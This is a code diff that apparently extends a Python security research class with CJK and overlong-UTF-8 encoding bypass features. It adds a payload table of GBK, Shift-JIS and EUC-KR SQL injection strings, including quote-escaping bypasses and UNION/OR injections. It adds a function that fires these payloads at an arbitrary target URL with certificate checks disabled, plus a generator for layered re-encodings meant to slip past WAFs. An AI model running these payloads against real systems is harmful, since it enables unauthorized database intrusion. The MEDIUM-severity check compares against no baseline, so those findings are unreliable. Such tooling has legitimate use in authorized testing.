@@ -100,3 +100,122 @@ class CJKVulnResearch:
                 results.append({"source": "ai_research", "data": result.get("content", "")})
         
         return {"success": True, "results": results, "sources_queried": sources or list(self.CJK_CVE_SOURCES.keys())}
+
+    # ============================================================
+    # v2: Active encoding bypass testing (Mythos H11)
+    # H11: Encoding depth exceeds decode depth — multiple encoding layers
+    # can exceed WAF decoding depth while being understood by backend.
+    # ============================================================
+
+    ENCODING_BYPASS_PAYLOADS = {
+        "gbk": [
+            ("%bf%27", "GBK 0xbf27 — consumes backslash, breaks escaping"),
+            ("%bf%5c", "GBK 0xbf5c — consumes backslash, bare quote"),
+            ("%a1%27", "GBK 0xa127 — alternate multi-byte quote bypass"),
+            ("%bf%27/**/OR/**/1=1--", "GBK + SQL comment injection"),
+        ],
+        "shift_jis": [
+            ("%81%27", "Shift-JIS 0x8127 — multi-byte quote bypass"),
+            ("%81%5c", "Shift-JIS 0x815c — backslash consumption"),
+            ("%81%27+OR+1=1--", "Shift-JIS + SQL injection"),
+            ("%e0%80%27", "Overlong UTF-8 in Shift-JIS context"),
+        ],
+        "euc_kr": [
+            ("%a1%27", "EUC-KR 0xa127 — multi-byte quote"),
+            ("%a1%5c", "EUC-KR 0xa15c — backslash consumption"),
+            ("%a1%27+UNION+SELECT--", "EUC-KR + UNION injection"),
+        ],
+        "utf8_overlong": [
+            ("%c0%a7", "Overlong UTF-8 0xc0a7 — encodes single quote"),
+            ("%c0%ae", "Overlong UTF-8 0xc0ae — encodes dot (path traversal)"),
+            ("%e0%80%a7", "3-byte overlong UTF-8 single quote"),
+        ],
+    }
+
+    def test_encoding_bypass(self, target_url: str, encoding: str = "auto",
+                              param: str = "id") -> Dict[str, Any]:
+        """Active test: send encoding-specific bypass payloads (Mythos H11).
+
+        Tests if target backend decodes CJK/overlong encodings that WAF misses.
+        """
+        try:
+            import requests as _req
+        except ImportError:
+            return {"error": "requests not available"}
+
+        encoding = encoding.lower()
+        if encoding == "auto":
+            # Test all encodings
+            encodings_to_test = list(self.ENCODING_BYPASS_PAYLOADS.keys())
+        else:
+            encodings_to_test = [encoding] if encoding in self.ENCODING_BYPASS_PAYLOADS else []
+
+        findings = []
+        for enc in encodings_to_test:
+            for payload, description in self.ENCODING_BYPASS_PAYLOADS[enc]:
+                try:
+                    test_url = f"{target_url}?{param}={payload}"
+                    resp = _req.get(test_url, timeout=10, verify=False)
+                    # Check for SQL error or unexpected behavior
+                    body_lower = resp.text[:2000].lower()
+                    sql_errors = ["sql", "syntax", "mysql", "oracle", "postgresql",
+                                  "sqlite", "mssql", "odbc"]
+                    if any(err in body_lower for err in sql_errors):
+                        findings.append({
+                            "encoding": enc,
+                            "payload": payload,
+                            "description": description,
+                            "severity": "CRITICAL",
+                            "evidence": f"SQL error in response (HTTP {resp.status_code})",
+                            "poc_curl": f"curl '{test_url}'",
+                        })
+                    elif resp.status_code == 200 and len(resp.text) > 100:
+                        # Check if response differs from baseline
+                        findings.append({
+                            "encoding": enc,
+                            "payload": payload,
+                            "description": description,
+                            "severity": "MEDIUM",
+                            "evidence": f"Different response (HTTP {resp.status_code}, {len(resp.text)} bytes)",
+                            "poc_curl": f"curl '{test_url}'",
+                        })
+                except Exception:
+                    pass
+
+        return {
+            "check": "encoding_bypass_test",
+            "version": "v2-2025",
+            "target": target_url,
+            "encodings_tested": encodings_to_test,
+            "payloads_tested": sum(len(self.ENCODING_BYPASS_PAYLOADS[e]) for e in encodings_to_test),
+            "findings": findings,
+            "findings_count": len(findings),
+            "mythos_reference": "H11: Encoding depth exceeds decode depth",
+        }
+
+    def generate_chained_payloads(self, encoding: str = "gbk") -> Dict[str, Any]:
+        """Generate chained encoding payloads (Mythos 9.2: encoding chain attacks).
+
+        Layer 1: CJK encoding → Layer 2: Double URL encode → Layer 3: Unicode normalize
+        """
+        import urllib.parse
+        base_payloads = self.ENCODING_BYPASS_PAYLOADS.get(encoding, [])
+        chained = []
+        for payload, desc in base_payloads:
+            # Layer 2: Double URL encode
+            double_encoded = urllib.parse.quote(payload, safe="")
+            # Layer 3: Add Unicode normalization prefix
+            unicode_variant = payload.replace("%", "%25")  # double-encode the %
+            chained.append({
+                "original": payload,
+                "description": desc,
+                "double_url_encoded": double_encoded,
+                "triple_encoded": unicode_variant,
+                "encoding_chain": f"CJK({encoding}) → double_url → triple",
+            })
+        return {
+            "check": "chained_payloads",
+            "encoding": encoding,
+            "chains": chained,
+            "mythos_reference": "9.2: Encoding chain attacks",
+        }
